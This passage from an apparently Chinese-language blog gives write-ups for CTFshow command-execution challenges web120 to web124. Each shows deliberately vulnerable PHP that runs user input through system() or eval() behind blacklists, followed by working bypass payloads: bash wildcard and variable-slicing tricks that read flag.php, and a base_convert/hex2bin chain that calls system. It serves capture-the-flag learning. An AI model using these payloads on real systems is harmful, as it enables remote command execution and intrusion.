æƒ³è¦åŒ¹é…/bin/base64 ????.???
</code></pre><p>{#RANDOM} = 4æˆ–5</p>
<p>ç”±äºå¯èƒ½æ˜¯5ï¼Œæ‰€ä»¥è¦å¤šè¯•å‡ æ¬¡ï¼Œè¿˜è¦è¿›è¡Œbase64è§£ç </p>
<h4 id="web120">web120<a hidden class="anchor" aria-hidden="true" href="#web120">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é¢˜æŠŠä¸Šé¢˜çš„HOMEä¹Ÿbanäº†ï¼Œä½†æ˜¯ç¬¬äºŒç§æ–¹æ³•è¿˜èƒ½å‡ºï¼Œè€Œä¸”é•¿åº¦ä¹Ÿç¬¦åˆ</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
</code></pre><p><img alt="image-20250118212249002" loading="lazy" src="../assets/image-20250118212249002.png"></p>
<p>æˆ–</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
</code></pre><h4 id="web121">web121<a hidden class="anchor" aria-hidden="true" href="#web121">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é¢˜SHLVLè¢«banäº†ï¼Œå¯ä»¥ç”¨?ä»£æ›¿</p>
<p>${#?}=1</p>
<p>payload</p>
<pre tabindex="0"><code>${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???
</code></pre><p>æˆ–</p>
<pre tabindex="0"><code>${PWD::${#?}}???${PWD::${#?}}${PWD::${#?}}?? ????.???
/bin/rev
</code></pre><p>revæ˜¯å€’å™è¾“å‡ºçš„</p>
<h4 id="web122">web122<a hidden class="anchor" aria-hidden="true" href="#web122">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é¢˜æŠŠPWDå’Œ#ä¹Ÿbanæ‰äº†</p>
<p>å¯ä»¥è€ƒè™‘ç”¨$?æ¥ä»£æ›¿${#1}</p>
<p>$?æ˜¯è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ payload:</p>
<pre tabindex="0"><code>&lt;A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.??? 
</code></pre><blockquote>
<p>&lt;AæŒ‡ä»¤ä¸çŸ¥é“æ˜¯å•¥ï¼ŒåŸ‹ä¸ªå‘</p></blockquote>
<h4 id="web124">web124<a hidden class="anchor" aria-hidden="true" href="#web124">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: æ”¶é›†è‡ªç½‘ç»œ
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-06 14:04:45
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="c1">//ä¾‹å­ c=20-1
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="c1"></span>    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">80</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;å¤ªé•¿äº†ä¸ä¼šç®—&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;\t&#39;</span><span class="p">,</span> <span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">,</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;\[&#39;</span><span class="p">,</span> <span class="s1">&#39;\]&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$blackitem</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$blackitem</span> <span class="o">.</span> <span class="s1">&#39;/m&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="c1">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="c1"></span>    <span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;abs&#39;</span><span class="p">,</span> <span class="s1">&#39;acos&#39;</span><span class="p">,</span> <span class="s1">&#39;acosh&#39;</span><span class="p">,</span> <span class="s1">&#39;asin&#39;</span><span class="p">,</span> <span class="s1">&#39;asinh&#39;</span><span class="p">,</span> <span class="s1">&#39;atan2&#39;</span><span class="p">,</span> <span class="s1">&#39;atan&#39;</span><span class="p">,</span> <span class="s1">&#39;atanh&#39;</span><span class="p">,</span> <span class="s1">&#39;base_convert&#39;</span><span class="p">,</span> <span class="s1">&#39;bindec&#39;</span><span class="p">,</span> <span class="s1">&#39;ceil&#39;</span><span class="p">,</span> <span class="s1">&#39;cos&#39;</span><span class="p">,</span> <span class="s1">&#39;cosh&#39;</span><span class="p">,</span> <span class="s1">&#39;decbin&#39;</span><span class="p">,</span> <span class="s1">&#39;dechex&#39;</span><span class="p">,</span> <span class="s1">&#39;decoct&#39;</span><span class="p">,</span> <span class="s1">&#39;deg2rad&#39;</span><span class="p">,</span> <span class="s1">&#39;exp&#39;</span><span class="p">,</span> <span class="s1">&#39;expm1&#39;</span><span class="p">,</span> <span class="s1">&#39;floor&#39;</span><span class="p">,</span> <span class="s1">&#39;fmod&#39;</span><span class="p">,</span> <span class="s1">&#39;getrandmax&#39;</span><span class="p">,</span> <span class="s1">&#39;hexdec&#39;</span><span class="p">,</span> <span class="s1">&#39;hypot&#39;</span><span class="p">,</span> <span class="s1">&#39;is_finite&#39;</span><span class="p">,</span> <span class="s1">&#39;is_infinite&#39;</span><span class="p">,</span> <span class="s1">&#39;is_nan&#39;</span><span class="p">,</span> <span class="s1">&#39;lcg_value&#39;</span><span class="p">,</span> <span class="s1">&#39;log10&#39;</span><span class="p">,</span> <span class="s1">&#39;log1p&#39;</span><span class="p">,</span> <span class="s1">&#39;log&#39;</span><span class="p">,</span> <span class="s1">&#39;max&#39;</span><span class="p">,</span> <span class="s1">&#39;min&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_getrandmax&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_rand&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_srand&#39;</span><span class="p">,</span> <span class="s1">&#39;octdec&#39;</span><span class="p">,</span> <span class="s1">&#39;pi&#39;</span><span class="p">,</span> <span class="s1">&#39;pow&#39;</span><span class="p">,</span> <span class="s1">&#39;rad2deg&#39;</span><span class="p">,</span> <span class="s1">&#39;rand&#39;</span><span class="p">,</span> <span class="s1">&#39;round&#39;</span><span class="p">,</span> <span class="s1">&#39;sin&#39;</span><span class="p">,</span> <span class="s1">&#39;sinh&#39;</span><span class="p">,</span> <span class="s1">&#39;sqrt&#39;</span><span class="p">,</span> <span class="s1">&#39;srand&#39;</span><span class="p">,</span> <span class="s1">&#39;tan&#39;</span><span class="p">,</span> <span class="s1">&#39;tanh&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="nx">preg_match_all</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$used_funcs</span><span class="p">);</span>  
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$used_funcs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="c1">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ
</span></span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="c1"></span>    <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo &#39;</span><span class="o">.</span><span class="nv">$content</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜è®¾ç½®äº†ç™½åå•å’Œé»‘åå•ï¼Œç™½åå•æ˜¯æ•°å­¦å‡½æ•°ï¼Œé»‘åå•åˆ™æ˜¯ä¸€äº›ç¬¦å·ï¼Œè€Œä¸”æœ‰é•¿åº¦é™åˆ¶</p>
<p>è¿™é¢˜çš„æ€è·¯å…¶å®å°±æ˜¯è¦è€ƒè™‘ç”¨æ•°å­—é€šè¿‡æ•°å­¦è¿ç®—å‡½æ•°çš„è½¬æ¢æ¥æ„é€ å‡ºæˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„å­—ç¬¦</p>
<p>å°±æ¯”å¦‚æˆ‘ä»¬å¯ä»¥å…ˆå°†éœ€è¦çš„å­—ç¬¦è½¬æ¢æˆ16è¿›åˆ¶åå†è½¬æ¢æˆ10è¿›åˆ¶ï¼Œå†æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™é€šè¿‡æ•°å­¦å‡½æ•°è½¬æ¢å›å»</p>
<p><a href="https://www.cnblogs.com/FallenStar/articles/17064728.html">CTFshow-WEBå…¥é—¨-å‘½ä»¤æ‰§è¡Œweb124 - Hacker&amp;Cat - åšå®¢å›­</a></p>
<pre tabindex="0"><code>ç›®æ ‡ä»£ç ï¼š$_GET[&#39;abs&#39;]($_GET[&#39;acos&#39;])
</code></pre><pre tabindex="0"><code>dechex()ï¼Œ10è¿›åˆ¶è½¬16è¿›åˆ¶

base_convert(å€¼,åŸè¿›åˆ¶,ç›®æ ‡è¿›åˆ¶)ï¼Œä»»æ„è¿›åˆ¶è½¬æ¢

hex2binï¼Œ16è¿›åˆ¶è½¬å­—ç¬¦ä¸²
</code></pre><p>è§£é¢˜ï¼š</p>
<p>base_convert(26941962055,10,34) ä¸º hex2bin</p>
<p>base_convert(26941962055,10,34)(dechex(1598506324)) ä¸º _GET</p>
<p>æ„é€ payload</p>
<pre tabindex="0"><code>c=$pi=base_convert(26941962055,10,34)(dechex(1598506324));$$pi{abs}($$pi{asin})&amp;abs=system&amp;asin=ls
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/post/ctfshow/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>CTFSHOW-ååºåˆ—åŒ–-Writeup</span>
  </a>
  <a class="next" href="http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>CTFSHOW-æ–‡ä»¶åŒ…å«-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">Â©2024 Xrntkk&rsquo;s Blog</a></span> Â· 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
    <span id="busuanzi_container_site_pv">
        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
    </span>
    <span id="busuanzi_container_site_uv">
        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
    </span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
